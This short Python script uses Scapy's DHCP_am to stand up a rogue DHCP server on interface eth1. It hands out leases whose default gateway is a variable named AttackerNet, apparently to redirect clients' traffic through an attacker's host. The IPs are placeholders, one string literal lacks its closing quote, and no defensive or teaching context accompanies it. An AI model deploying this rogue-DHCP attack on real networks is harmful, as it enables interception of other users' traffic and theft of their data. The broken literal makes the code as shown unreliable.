from scapy.all import DHCP_am
from scapy.base_classes import Net

OurNetwork = 'X.X.X.X'
AttackerNet = 'X.X.X.X4

dhcp_server = DHCP_am(iface='eth1',
                      pool=Net(OurNetwork),
                      network=OurNetwork,
                      gw=AttackerNet,
                      renewal_time=600, lease_time=3600)
dhcp_server()
